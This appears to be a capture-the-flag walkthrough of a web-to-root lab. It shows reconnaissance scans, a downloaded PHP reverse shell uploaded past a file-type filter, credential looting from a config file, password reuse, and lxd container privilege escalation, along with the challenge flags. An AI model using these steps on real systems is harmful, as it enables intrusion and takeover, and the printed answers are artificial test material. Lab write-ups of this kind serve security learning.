---
description: Web
---

# The Trial Before Christmas

## Video

## Resources

## Challenges

### Scan the machine. What ports are open?

```
nmap -sC -sV -T5 -p1-65535 10.10.243.219
```

![](<../.gitbook/assets/image (359).png>)

{% hint style="success" %}
80, 65000
{% endhint %}

### What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.

```
gobuster dir -u http://10.10.243.219 -w /usr/share/dirb/wordlists/common.txt
```

![](<../.gitbook/assets/image (360).png>)

```
gobuster dir -u http://10.10.243.219:65000 -w /usr/share/dirb/wordlists/common.txt -x php -t 50
```

![](<../.gitbook/assets/image (362).png>)

![](<../.gitbook/assets/image (363).png>)

{% hint style="success" %}
Light Cycle
{% endhint %}

### What is the name of the hidden php page?

```
gobuster dir -u http://10.10.243.219:65000 -w /usr/share/dirb/wordlists/common.txt -x php -t 50
```

![](<../.gitbook/assets/image (364).png>)

{% hint style="success" %}
uploads.php
{% endhint %}

### What is the name of the hidden directory where file uploads are saved?

{% hint style="success" %}
grid
{% endhint %}

### Bypass the filters. Upload and execute a reverse shell.&#x20;

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

mv php-reverse-shell.php image.jpeg.php
```

![](<../.gitbook/assets/image (365).png>)

![](<../.gitbook/assets/image (366).png>)

![](<../.gitbook/assets/image (367).png>)

{% hint style="success" %}
No answer needed
{% endhint %}

### What is the value of the web.txt flag?



![](<../.gitbook/assets/image (368).png>)

{% hint style="success" %}
THM{ENTER\_THE\_GRID}
{% endhint %}

### Upgrade and stabilize your shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

{% hint style="success" %}
No answer needed
{% endhint %}

### Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? **username:password**

```
cd /var/www/
cd TheGrid
cd includes
cat dbauth.php
```

![](<../.gitbook/assets/image (369).png>)

{% hint style="success" %}
tron:IFightForTheUsers
{% endhint %}

### Access the database and discover the encrypted credentials. What is the name of the database you find these in?

```
mysql -u tron -p
IFightForTheUsers
show databases;
use tron;

```

![](<../.gitbook/assets/image (370).png>)

{% hint style="success" %}
tron
{% endhint %}

### Crack the password. What is it?

{% embed url="https://hashes.com/en/tools/hash_identifier" %}

![](<../.gitbook/assets/image (371).png>)

{% hint style="success" %}
@computer@
{% endhint %}

### Use su to login to the newly discovered user by exploiting password reuse.

![](<../.gitbook/assets/image (372).png>)

{% hint style="success" %}
No naswer needed
{% endhint %}

### What is the value of the user.txt flag?

{% hint style="success" %}
THM{IDENTITY\_DISC\_RECOGNISED}
{% endhint %}

### Check the user's groups. Which group can be leveraged to escalate privileges?

```
id
group
```

![](<../.gitbook/assets/image (373).png>)

{% hint style="success" %}
lxd
{% endhint %}

### Abuse this group to escalate privileges to root.

```
lxc image list
lxc init Alpine strongbad -c security.privileged=true
lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true
lxc start strongbad
lxc exec strongbad /bin/sh

```

![](<../.gitbook/assets/image (374).png>)

{% hint style="success" %}
No answer needed
{% endhint %}

### What is the value of the root.txt flag?

{% hint style="success" %}
THM{FLYNN\_LIVES}
{% endhint %}
